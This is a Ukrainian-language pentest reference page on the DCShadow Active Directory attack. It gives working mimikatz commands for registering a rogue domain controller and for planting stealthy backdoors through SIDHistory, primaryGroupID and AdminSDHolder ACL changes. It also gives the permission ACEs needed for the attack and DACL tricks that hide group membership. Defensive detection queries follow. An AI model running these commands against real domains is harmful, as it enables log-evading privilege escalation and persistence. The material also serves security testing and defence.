# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

Він реєструє **новий Domain Controller** в AD і використовує його для **надсилання атрибутів** (SIDHistory, SPNs...) указаним об’єктам **без залишення будь-яких **логів** щодо **модифікацій**. Вам **потрібні привілеї DA**, а також ви маєте перебувати всередині **кореневого домену**.\
Зверніть увагу: якщо ви використаєте неправильні дані, з’являться дуже неприємні логи.<sup>[[2]](#references)</sup>

Для виконання атаки потрібні 2 екземпляри mimikatz. Один із них запустить RPC-сервери з привілеями SYSTEM (тут потрібно вказати зміни, які ви хочете виконати), а другий екземпляр буде використано для надсилання значень:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Зверніть увагу, що **`elevate::token`** не працюватиме в сесії `mimikatz1`, оскільки ця команда підвищує привілеї потоку, а нам потрібно підвищити **привілеї процесу**.\
Також можна вибрати об'єкт "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Ви можете внести зміни від імені DA або користувача з такими мінімальними дозволами:

- У **об'єкті домену**:
- _DS-Install-Replica_ (Додавання/видалення репліки в домені)
- _DS-Replication-Manage-Topology_ (Керування топологією реплікації)
- _DS-Replication-Synchronize_ (Синхронізація реплікації)
- **Об'єкт Sites** (і його дочірні об'єкти) у **контейнері Configuration**:
- _CreateChild і DeleteChild_
- Об'єкт **комп'ютера, зареєстрованого як DC**:
- _WriteProperty_ (не Write)
- **Цільовий об'єкт**:
- _WriteProperty_ (не Write)

Ви можете використовувати [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), щоб надати ці привілеї непривілейованому користувачу (зверніть увагу, що це залишить деякі логи). Це значно обмеженіше, ніж надання привілеїв DA.\
Наприклад: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Це означає, що користувач _**student1**_, який увійшов у систему на машині _**mcorp-student1**_, має дозволи DCShadow щодо об'єкта _**root1user**_.

## Використання DCShadow для створення backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Зловживання primary group, прогалини в переліку та виявлення

- `primaryGroupID` є окремим атрибутом від списку `member` групи. DCShadow/DSInternals можуть записувати його безпосередньо (наприклад, встановити `primaryGroupID=512` для **Domain Admins**) без примусового контролю з боку LSASS на хості, але AD все одно **переміщує** користувача: зміна PGID завжди вилучає членство з попередньої primary group (така сама поведінка для будь-якої цільової групи), тому зберегти старе членство в primary group неможливо.<sup>[[1]](#references)</sup>
- Стандартні інструменти не дозволяють вилучити користувача з його поточної primary group (`ADUC`, `Remove-ADGroupMember`), тому зміна PGID зазвичай потребує прямих записів у directory (DCShadow/`Set-ADDBPrimaryGroup`).
- Звіти про членство є непослідовними:
- **Включають** членів, визначених через primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Не включають** членів, визначених через primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit під час перевірки `member`, `Get-ADUser <user> -Properties memberOf`.
- Рекурсивні перевірки можуть не виявити членів primary group, якщо **сама primary group вкладена** (наприклад, PGID користувача вказує на вкладену групу всередині Domain Admins); `Get-ADGroupMember -Recursive` або рекурсивні LDAP-фільтри не повернуть такого користувача, якщо рекурсія явно не обробляє primary groups.
- Прийоми з DACL: зловмисники можуть **заборонити ReadProperty** для `primaryGroupID` на об'єкті користувача (або для атрибута `member` груп, які не захищені AdminSDHolder), приховуючи ефективне членство від більшості запитів PowerShell; `net group` все одно визначить це членство. Групи, захищені AdminSDHolder, скидатимуть такі заборони.

Приклади виявлення/моніторингу:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Перевірте привілейовані групи, порівнявши результат `Get-ADGroupMember` із `Get-ADGroup -Properties member` або ADSI Edit, щоб виявити розбіжності, спричинені `primaryGroupID` або прихованими атрибутами.<sup>[[1]](#references)</sup>

## Shadowception - Надання permissions для DCShadow за допомогою DCShadow (без журналів змінених permissions)

Нам потрібно додати наступні ACE з SID нашого користувача в кінці:<sup>[[2]](#references)</sup>

- На об’єкті домену:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- На об’єкті комп’ютера зловмисника: `(A;;WP;;;UserSID)`
- На об’єкті цільового користувача: `(A;;WP;;;UserSID)`
- На об’єкті Sites у контейнері Configuration: `(A;CI;CCDC;;;UserSID)`

Щоб отримати поточний ACE об’єкта: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

У цьому випадку потрібно виконати **кілька змін**, а не лише одну. У сесії **mimikatz1** (RPC server) використовуйте параметр **`/stack` для кожної зміни**. Потім потрібно виконати **`/push`** лише один раз, щоб застосувати всі зміни, додані в stack, із rogue server.

[**Більше інформації про DCShadow на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Дослідження поведінки, звітності та експлуатації Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [Опис DCShadow на ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
